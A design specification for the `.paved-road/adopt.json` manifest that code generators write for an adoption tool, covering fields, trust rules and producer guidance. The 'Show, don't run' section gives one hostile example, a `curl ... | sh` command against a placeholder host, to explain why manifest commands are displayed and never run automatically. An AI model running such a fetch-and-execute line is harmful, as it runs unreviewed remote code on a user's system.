# The adoption manifest — `.paved-road/adopt.json`

`/paved-road:adopt` starts with **detection**: infer the stack, find the real install / build /
test / run commands, check the git state, scan for committed secrets and real data. On an
arbitrary repo that is guesswork — an educated read of `package.json` and a directory listing,
right most of the time and quietly wrong the rest of it.

On a **generated** app it doesn't have to be guesswork. The generator wrote every byte: it knows
the stack, the entry point, whether there is an install step at all, whether it ever wrote a
secret. The adoption manifest is the file where a generator says so, so adoption starts from
knowledge instead of inference.

This spec is **generator-agnostic**. Dunable is the first producer; a Cloudflare OS Gadget
export, a scaffolder, an internal template renderer, or a tool nobody has written yet is the
second. Nothing in v1 is specific to any one of them — a producer is identified by the
`generator` block and by nothing else, and a reader must never branch on `generator.name`.

> **Not the app manifest.** [`docs/MANIFEST.md`](MANIFEST.md) describes a *different* artifact:
> the live `GET /api/meta/manifest` projection of a **running paved-road app's** routes,
> permissions and audit verbs. That one is generated from the code at runtime and is trusted
> (the app produces it about itself, behind owner/admin auth). This one is a **static file
> written by an outside tool about a repo that hasn't been adopted yet**, and it is untrusted.
> Same word, opposite trust posture.

## Where it lives

```text
<repo root>/
  .paved-road/
    adopt.json     ← the manifest (this spec)
    ORIGIN.md      ← optional: the originating prompt + iteration history
    brand.json     ← optional: the design tokens that shaped the app
```

- **Committed, not ignored.** The manifest is provenance. A generated app that ships its
  `.paved-road/` directory to GitHub keeps the record of where it came from; one that gitignores
  it loses the only copy the moment the generator's project is deleted.
- **Repo root only.** `adopt` looks in exactly one place. No search, no walking up, no
  environment variable — one path or nothing.
- **UTF-8 JSON, no comments, no trailing commas.** It is read by machines that must not
  negotiate. A producer that needs to explain something uses `ORIGIN.md`.
- **Small.** A reader may refuse a file over ~64 KB as invalid rather than parse it. Nothing in
  v1 needs more than a couple of kilobytes; a large `adopt.json` means something has gone wrong.

## The v1 shape

This is the whole contract. Pinned, verbatim:

```json
{
  "manifestVersion": 1,
  "generator": {
    "name": "dunable",
    "version": "0.4.2",
    "projectId": "proj_8f3c21",
    "generatedAt": "2026-08-14T09:31:07Z"
  },
  "app": {
    "name": "expense-tracker",
    "summary": "Logs team expenses and charts them by category.",
    "owner": "someone@example.com"
  },
  "stack": {
    "kind": "static-spa",
    "entry": "index.html",
    "install": null,
    "build": null,
    "test": null,
    "run": null
  },
  "provenance": {
    "originDoc": ".paved-road/ORIGIN.md",
    "brandDoc": ".paved-road/brand.json"
  },
  "claims": {
    "secrets": "none",
    "realData": "none",
    "ci": "none",
    "durableState": "none",
    "complete": "yes"
  },
  "suggestedTier": 1
}
```

**One value in there is not a constant.** `claims.complete` is the only field whose correct value
can differ between two runs of the *same* generator on the *same* project — everything else is
either per-project (`app.name`) or a stable property of the generator (`secrets`, `ci`). Copying
this example into an emitter and hardcoding `"yes"` is the way this field fails: it stays correct
right up until someone adds a size cap for memory safety, and from then on every over-cap export
asserts completeness while shipping a fragment. **Compute it per export.**

### Fields

| Field | Type | Meaning |
|---|---|---|
| `manifestVersion` | number | Shape version of **this file format**. Exactly `1` for this spec. A number, never a string, never semver. |
| `generator.name` | string | Lowercase slug of the producing tool (`"dunable"`, `"cf-os-gadget"`). The only place a producer names itself. |
| `generator.version` | string | The producer's own version, verbatim. Free-form — it's for humans reading a bug report. |
| `generator.projectId` | string | Opaque id of the originating project **in the generator's system**, so a human can find the source of truth later. Never parsed. |
| `generator.generatedAt` | string | ISO 8601 timestamp, UTC (`2026-08-14T09:31:07Z`). When the manifest was written, which is when the app was last generated. |
| `app.name` | string | Human name of the app. Seeds the GitHub repo name, the Linear project, and the working agreement's title — all of which the user confirms. |
| `app.summary` | string | One or two sentences: what the app does. Seeds the Linear project description. |
| `app.owner` | string | Email of the human the generator believes is accountable. **A suggestion, never an assignment** — Tier 1 requires a *named, confirmed* owner, so `adopt` puts this in front of the user and waits. |
| `stack.kind` | string | One of `"static-spa"`, `"node-worker"`, `"other"`. An unrecognized value is read as `"other"` — it must not invalidate the manifest (see *Forward compatibility*). |
| `stack.entry` | string — **omit when absent, never `null`** | Repo-relative path to the thing that runs or serves first: `index.html`, `src/index.ts`, `main.py`. Not nullable: `null` here asserts *this app has no entry point*, which is a claim almost nobody means to make (see *`null` is a claim*). |
| `stack.install` | string \| null | The install command, or `null`. |
| `stack.build` | string \| null | The build command, or `null`. |
| `stack.test` | string \| null | The test command, or `null`. |
| `stack.run` | string \| null | The command that runs it locally, or `null`. |
| `provenance.originDoc` | string \| null | Repo-relative path to the origin document, conventionally `.paved-road/ORIGIN.md`. |
| `provenance.brandDoc` | string \| null | Repo-relative path to the design tokens, conventionally `.paved-road/brand.json`. |
| `claims.secrets` | string | What the generator believes it wrote regarding credentials. `"none"` is reserved and means "I wrote no secret". |
| `claims.realData` | string | Same, for non-synthetic data in seeds/fixtures/content. |
| `claims.ci` | string | Same, for continuous integration the generator set up. |
| `claims.durableState` | string | Same, for state the app persists (a database, a bucket, a KV namespace). |
| `claims.complete` | string | Whether the generator exported the **whole** project — repo contents *and* companion documents. `"yes"` is reserved and means nothing was left out; any other value, conventionally `"truncated"`, means something was. Optional: an absent key says nothing. |
| `suggestedTier` | number | `1` or `2` — the tier the generator would pick. **Advisory only** (see *Tiers are unchanged*). |

### `null` is a claim; a missing key is silence

The four `stack` commands are nullable on purpose, and the distinction is load-bearing:

- `"install": null` means **there is no install step**. A static SPA with no dependencies
  genuinely has none, and the generator is the authority on that. A reader should stop looking.
- **Key absent entirely** means the generator didn't say. A reader falls back to detection for
  that one field and keeps everything else from the manifest.

A producer that isn't sure omits the key. Writing `null` to mean "I don't know" is the one way
to make this file actively worse than no file, because it converts an unknown into a confident
"there is none".

**`null` carries that meaning for the four `stack` commands and nowhere else.** Anywhere else in
the manifest a `null` is just a wrong-typed value, read as *not stated* (see *What makes a
manifest valid*) — so it is never the right way to say anything.

`stack.entry` is where this bites, and it earns its own sentence because it is the one
non-nullable string a producer is most likely to have nothing for. **`"entry": null` asserts that
this app has no entry point** — a thing almost no producer means to say. A project with no files,
or one whose entry point the generator genuinely cannot name, **omits the key**; the reader then
detects that one field, which is the outcome the producer wanted. (The first producer emitted
`"entry": null` for an empty project and corrected it — this paragraph exists so the next one
doesn't pay for the same reading twice.)

### Every claim reserves the reassuring value

A `claims` field is read by comparing it against **one reserved value — always the reassuring
one**:

| Field | Reserved value | Means |
|---|---|---|
| `secrets`, `realData`, `ci`, `durableState` | `"none"` | "I wrote none of this." |
| `complete` | `"yes"` | "I exported all of it." |

Every other string is read as *not* that value. `"unknown"`, `"partial"`, `"some"`, a typo, a
word from a v2 vocabulary this reader has never seen — all of them land on the cautious side,
because the reserved value is the only one that would let a reader relax. That is the whole point
of reserving the reassuring value rather than the alarming one: **an unrecognized string fails
toward the warning, never toward silence.** A producer that writes `"complete"` where the spec
says `"yes"` gets a spurious warning; one that writes `"capped"` where the spec suggests
`"truncated"` still gets the right one. Only the harmless mistake is possible.

It is also what lets a producer be honest without negotiating an enum. A generator that cannot
prove a customer name is absent from free text answers `realData: "unknown"` and conforms exactly
— no special case, no new value to standardize, and the reader does the same thing it would have
done with any other non-`"none"` string.

An **absent** key is different again, and still means silence: the producer didn't say, so the
reader says nothing. That is what keeps a new claim additive — every producer written before
`complete` existed omits it and is read precisely as it was before.

### A claim of safety is not evidence; a claim of trouble is

`claims` is untrusted in both directions — that is the whole reason for the field's name, argued
in *Why the field is called `claims`* below. But the two directions cost differently, and a reader
that treats them identically gets one of them wrong:

- **A claim of safety is never evidence.** `"none"`, `"yes"` — a compromised generator, a buggy
  one, and an honest one with a blind spot all emit these. They buy the producer nothing but
  silence, and a reader that converted one into an assurance would be reporting the result of a
  scan nobody ran.
- **A claim of trouble is self-incriminating, so act on it.** `"truncated"`, or a `secrets` value
  that admits a `.env`, costs the producer something to say and costs the reader only a warning to
  honor. Nobody fakes these, and a reader that ignored one would be discarding the only copy of a
  fact that exists nowhere else in the repo.

### `claims.complete` — the export might be a fragment

A generator with a size bound produces a partial copy past that bound. The first producer caps an
export so that a large project cannot exhaust the worker's memory; past the cap the archive is
genuinely incomplete, and **nothing in the repo says so.** That is this format's worst failure
mode — Tier 1 guardrails wrapped around a partial app, or a Tier 2 rebuild planned from a
truncated `ORIGIN.md`, with the adopter believing they hold the whole thing.

It sits in `claims`, and it belongs there on this spec's own test rather than by convention.
Completeness is **not** cheap to verify: a reader would need the original to compare against, and
the original is in the generator's system, not in the repo. And it is **not** harmless if wrong:
a truncated repo that claims `"yes"` doesn't fail loudly the way a wrong build command does, it
simply looks like a smaller app. Silent by construction — which is the definition of a claim here,
and the reason it is not a `stack` field.

Being untrusted costs it nothing, because the field can only ever cost the producer:

- `"yes"` buys **silence, not a guarantee.** A reader does not repeat it, does not tell the user
  the export is whole, and never presents `ORIGIN.md` as the complete history on its authority. It
  gets exactly what omitting the key gets.
- `"truncated"` is the only value a reader acts on — and it is the one no producer gains anything
  by faking.

**Scope: the whole export**, repo contents *and* the companion documents. A producer that shipped
every file but capped the iteration history still answers `"truncated"`. The Tier 2 payload *is*
`ORIGIN.md`, so a truncated history is squarely the case this field exists to catch, and a
producer reasoning "the code is all there" would defeat it. What was cut, and roughly how much,
goes in `ORIGIN.md` prose; the manifest carries the flag, not the inventory.

**A reader says it out loud.** `adopt` surfaces a `complete` that isn't `"yes"` in its Step 1
summary, alongside the facts it detected and **before** the Step 2 tier question — because it
changes the answer to that question. A truncated adoption that proceeds silently is the entire
failure this field exists to prevent.

### What makes a manifest *valid*

A reader treats the file as a usable v1 manifest when **all** of these hold:

1. it parses as JSON and the top level is an object;
2. `manifestVersion` is the number `1`;
3. `app.name` is a non-empty string;
4. `stack` is an object and `stack.kind` is a non-empty string.

Everything else is optional. Anything absent, `null`, or of the wrong type is read as *not
stated* and falls back to detection for that field alone — a manifest is never all-or-nothing
past the four rules above. (The four `stack` commands are the one exception: there `null` is
meaningful, not wrong-typed — see *`null` is a claim*.)

### Forward compatibility — invalid is not an error

**An invalid or unrecognized manifest is ignored, never fatal.** No file, malformed JSON, a
truncated write, `"manifestVersion": 2` from a producer that got ahead of this spec, a missing
`app.name` — every one of them lands in the same place: the reader ignores the file entirely and
detects the repo exactly as it would have without it. It does not warn loudly, it does not stop,
it does not ask the user to fix their generator. Adoption of a working app must never be blocked
by a metadata file.

The symmetric rule points the other way: **unknown keys are ignored, not rejected.** A producer
may add fields; a v1 reader passes over them. That is what makes `manifestVersion` bumpable
without a flag day — v2 producers keep emitting a valid v1 core, v1 readers keep working, and a
v2 reader picks up the extras.

## Why the field is called `claims` and not `riskScan`

Because the manifest is **written by the artifact being adopted**. It arrives with the repo, in
the repo, from a tool that is not `adopt` and is not the user. That makes it untrusted input, no
different in kind from the repo's own source files — and `adopt`'s whole job in Step 1 is to
find out what is actually in there.

`riskScan: { secrets: "none" }` reads like a finding. It would be the *only* security finding in
the entire flow that nobody performed. Name it `claims` and the epistemics are in the field name:
the generator is asserting something, and an assertion is not evidence. A compromised generator,
a buggy one, or an honest one that templated a `.env.example` it forgot about all produce the
same cheerful `"none"`, and a scan that trusted it would find nothing because it never looked.

So the split a reader must hold:

| | Trusted from the manifest | Never trusted |
|---|---|---|
| **What** | `stack.kind`, `entry`, the four commands, `app.*`, `provenance.*` | `claims.*` — every field, always |
| **Why it's safe / not** | Cheap to verify against the repo, and harmless if wrong: a wrong build command fails loudly the first time someone runs it | A false negative is *silent by construction* — believing "no secrets" means never running the scan that would have found one, and believing `complete: "yes"` means never asking what is missing from a repo that offers no way to tell |

**The risk scan runs in full, independently, every time.** Committed secrets, real (non-synthetic)
data, missing tests, no CI — `adopt` looks for all of it with its own eyes whether or not a
manifest is present, and whether or not that manifest says `"none"`. The manifest may be
*recorded* alongside the findings ("the generator claimed no secrets; the scan agrees / disagrees")
— a disagreement is itself a useful signal about the producer — but it never substitutes for one.

### Show, don't run

The commands are trusted as *facts about the repo*, not as authority to execute. `adopt` echoes a
manifest command to the user before it runs, exactly as it would a command it detected itself. A
file in the repo saying `"install": "curl https://example.invalid/x.sh | sh"` gets shown, not
executed — the trust boundary would be worthless if a JSON file could run arbitrary shell by
being present.

## Companion files

Both are optional and both are pointed at by `provenance`. Producers converge on these paths so a
reader can find them; the manifest is still the only file whose *shape* v1 pins.

### `.paved-road/ORIGIN.md` — the originating prompt and the iteration history

The prompt the app was generated from, plus the follow-up turns that shaped it: what was asked
for, what was rejected, what changed and why.

**For a Tier 2 rebuild this is worth more than the generated code.** The generated code is one
tool's answer to the question. `ORIGIN.md` is the question — the actual specification, including
the requirements the generator got wrong and was corrected on. Rebuilding on the kit from the
spec produces a better app than porting an implementation line by line, and the generator is the
**only place that history exists**: it lives in a chat session that no clone of the repo
contains. If it isn't written to the repo at generation time, it is gone.

No pinned schema — it is prose for humans (and for the agent doing the rebuild). Conventional
sections: the original prompt, the iteration log, known gaps.

**Extraction notes belong here too, not in JSON.** A generator that normalizes archive paths for
Zip Slip safety can collide two stored paths and rename the later one. That changes a *name*, not
content; no reader branches on it, and a field only the producer understands is a field nobody
acts on. Prose here is the whole answer. The line where it stops being prose: if a collision made
the generator **drop** a file rather than rename it, the export is short one file, and that is
`claims.complete: "truncated"` — not an extraction note. Renames are narrative; omissions are a
claim.

### `.paved-road/brand.json` — the design tokens that shaped the app

Colors, type, spacing, radii — whatever the generator applied. A Tier 2 rebuild re-implements the
UI on the kit's React SPA and should land looking like the app the user already approved, not a
default theme. A Tier 1 adoption doesn't touch it; it just travels with the repo.

No pinned schema in v1: producers differ, and a wrong-shaped design token file costs nothing.
Point at whatever you write.

**Consumer:** `/paved-road:port-ui` (Tier 2's default design-port step) reads it during
inventory, next to the app's own CSS, and records what it used in the design contract
(`.paved-road/design.json` → `docs/design/DESIGN-CONTRACT.md`, see
[DESIGN-PORT.md](DESIGN-PORT.md)).

## Tiers are unchanged

A manifest changes **nothing** about what adoption is or what it produces:

- **Tier 1 — Guardrails.** Source into GitHub, a Linear project, CI, a named owner, the working
  agreement, branch/PR discipline. The app keeps its own runtime.
- **Tier 2 — Rebuild on the kit.** A planned, incremental migration onto Cloudflare Workers +
  Hono + RBAC + audit, in reviewable PRs.

The tier is still the **user's** answer to the Step 2 question. `suggestedTier` is a hint from a
tool that has never met the user, sitting next to `claims` in the same untrusted file; it may
inform how `adopt` frames the question and it may not decide the answer. A manifest only removes
guesswork from *getting* to the question.

## Writing a producer

A conformance checklist for a generator that wants its output to adopt cleanly:

1. **Write `.paved-road/adopt.json` at the repo root**, UTF-8, strict JSON, and make sure it is
   committed rather than gitignored.
2. **Emit `manifestVersion: 1`** as a number.
3. **Always fill `app.name`, `stack.kind` and `stack.entry`.** Those are what the reader can't
   guess as well as you can. If you have nothing for `stack.entry`, **omit the key** — never
   `null`, which asserts the app has no entry point.
4. **Use `null` for a command only when there genuinely is none.** Omit the key when unsure, and
   remember `null` means something only in those four fields — anywhere else, omit.
5. **Say so when you truncate.** If your export has a size bound and you hit it, emit
   `claims.complete: "truncated"` and put what was cut in `ORIGIN.md`. This is the one claim a
   reader acts on, and you are the only one who can make it — nothing in the delivered repo
   reveals that it is a fragment.
6. **Be honest in `claims`, and expect not to be believed.** Each field reserves one value —
   `"none"` for the four above, `"yes"` for `complete` — and any other string is read as *not*
   that, changing nothing about the scan. Claiming `"none"` while writing a `.env` doesn't get
   past adoption; it just makes your manifest a worse source of information. When you can't
   honestly claim the reserved value, say anything else (`"unknown"` is fine) — that conforms.
7. **Write `ORIGIN.md`.** It is the highest-value byte you can put in the repo, and you are the
   only one who can write it.
8. **Never put a secret in the manifest.** It is committed, it is plain text, and it is the first
   file a reader opens. Nothing in v1 takes a credential; nothing in v2 will either.
9. **Don't be clever with the commands.** They are shown to a human and then run in their shell.
   One project command per field.

## Versioning this spec

`manifestVersion` is an integer that bumps only when the **meaning or requirement** of an
existing field changes. Adding optional fields does not bump it — v1 readers ignore unknown keys
by rule, so additive change is free.

`claims.complete` is the worked example: it was specified after v1 shipped and **v1 did not
bump**. A producer that never emits it is still a conforming v1 producer; a reader that has never
heard of it ignores it, exactly as the unknown-keys rule promises. Bumping would have stranded
every existing reader in exchange for nothing. When a v2 does arrive, v1 stays readable: a producer that
can emit both should emit a valid v1 core plus the v2 extras, and a v1 reader falls back to
detection on anything it can't validate.

## See also

- [`ADOPT-EXISTING.md`](ADOPT-EXISTING.md) — the adoption how-to, both tiers.
- [`MANIFEST.md`](MANIFEST.md) — the *app* manifest: a running app's own live route/permission
  projection. Different artifact, different trust posture (see the note at the top).
- `plugins/paved-road/commands/adopt.md` — the command that reads this file.
